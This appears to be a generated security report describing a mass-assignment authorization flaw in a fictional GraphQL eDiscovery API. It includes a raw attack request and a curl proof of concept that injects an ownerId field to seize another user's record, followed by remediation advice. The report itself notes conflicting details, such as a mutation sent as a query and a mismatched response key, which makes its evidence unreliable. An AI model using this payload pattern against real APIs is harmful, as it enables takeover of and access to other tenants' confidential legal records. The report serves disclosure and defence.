# Security Analysis Report
**System:** LexVault eDiscovery API
**Domain:** Legal Tech / eDiscovery
**Example ID:** GQL-0274
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BOLA — Pattern 1.12 | Mass assignment via object fields on `updateResource` — attacker reassigns ownership of eDiscovery records by injecting `ownerId` in mutation input |

---

## Finding 1 — BOLA: Mass Assignment via Object Fields on updateResource Mutation (Pattern 1.12)

### Summary
The GraphQL API at `https://api.lexvault-ediscovery-.example.com/graphql` exposes an `updateResource` mutation that accepts `ownerId` and `tenantId` as writable fields in the input object. This allows mass assignment of ownership attributes — the attacker injects `ownerId: "attacker-34f12d14"` to take ownership of eDiscovery record `R-2274`. The server response returns data for `other-user-34f12d14` under the `getResource` key (see inconsistency note below).

**Context.txt inconsistency (documented):** The HAR request uses `updateResource(id: "R-2274", input: {status: "approved", ownerId: "attacker-34f12d14"})` (mutation/write), while the HAR response returns data under the key `getResource` (read). These names conflict. Both are faithfully reproduced here.

**Note:** `x-request-id: req-34f12d14` is a server-assigned response header; it does not appear in the outgoing request.

**Pattern:** 1.12 — Mass assignment via object fields (BOLA)
**Affected endpoint:** `POST https://api.lexvault-ediscovery-.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack (mutation)**
```
POST https://api.lexvault-ediscovery-.example.com/graphql
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
Content-Type: application/json

{"query":"query VulnerableOp { updateResource(id: \"R-2274\", input: {status: \"approved\", ownerId: \"attacker-34f12d14\"}) { resourceId status } }"}
```

**Response — Victim eDiscovery Record**
```json
{
  "data": {
    "getResource": {
      "tenantId": "tenant-2d14",
      "ownerId": "other-user-34f12d14",
      "data": {
        "sensitiveField": "CONFIDENTIAL-34f12d14",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```

### Steps to Reproduce
```bash
TOKEN="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG"
curl -s -X POST "https://api.lexvault-ediscovery-.example.com/graphql" \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"query":"query VulnerableOp { updateResource(id: \"R-2274\", input: {status: \"approved\", ownerId: \"attacker-34f12d14\"}) { resourceId status } }"}'
# Vulnerable: ownerId reassigned; sensitiveField: CONFIDENTIAL-34f12d14
# Secure: {"errors":[{"message":"Forbidden — ownerId/tenantId not writable"}]}
```

### Remediation
1. Remove `ownerId` and `tenantId` from the mutation input type — they must never be client-writable.
2. Resolver must compare `object.tenantId` against JWT `tenantId` claim.
3. Allowlist permitted writable fields in the input object.
